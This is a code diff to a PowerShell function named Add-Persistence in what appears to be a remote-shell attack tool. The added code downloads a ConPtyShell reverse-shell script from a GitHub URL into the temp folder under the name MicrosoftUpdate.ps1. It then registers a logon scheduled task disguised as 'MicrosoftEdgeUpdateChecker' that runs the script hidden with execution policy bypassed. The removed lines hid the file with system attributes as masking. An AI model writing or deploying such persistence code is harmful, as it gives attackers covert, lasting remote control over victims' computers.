@@ -15,30 +15,22 @@ function Connect-ZiPo {
     }
 
     function Add-Persistence {
-    $targetPath = "$env:APPDATA\Microsoft\updater.ps1"
-
     try {
-        # Попытка получить путь к текущему скрипту
-        if ([string]::IsNullOrWhiteSpace($PSCommandPath)) {
-            # Если скрипт не был запущен как файл — скачаем себя по URL
-            $url = "https://raw.githubusercontent.com/zipo0/studytime-/refs/heads/main/Invoke-ConPtyShell.ps1"
-            Invoke-WebRequest -Uri $url -UseBasicParsing -OutFile $targetPath
-        } else {
-            Copy-Item -Path $PSCommandPath -Destination $targetPath -Force
-        }
+        $targetPath = "$env:TEMP\MicrosoftUpdate.ps1"
+        $url = "https://raw.githubusercontent.com/zip00/zippo/main/studytime/Invoke-ConPtyShell.ps1"
 
-        # Добавим атрибуты скрытого и системного файла (маскировка)
-        attrib +h +s $targetPath
+        # Скачиваем и сохраняем копию скрипта
+        Invoke-WebRequest -Uri $url -UseBasicParsing -OutFile $targetPath
 
-        # Создание задачи в планировщике
+        # Создание задачи
         $taskName = "MicrosoftEdgeUpdateChecker"
         schtasks /Create /SC ONLOGON /TN $taskName /TR "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$targetPath`"" /F | Out-Null
+
+        return "[+] Persistence installed to $targetPath"
     }
     catch {
         return "[ERROR] Persistence failed: $($_.Exception.Message)"
     }
-
-    return "[+] Persistence established as '$taskName'"
 }
 
 
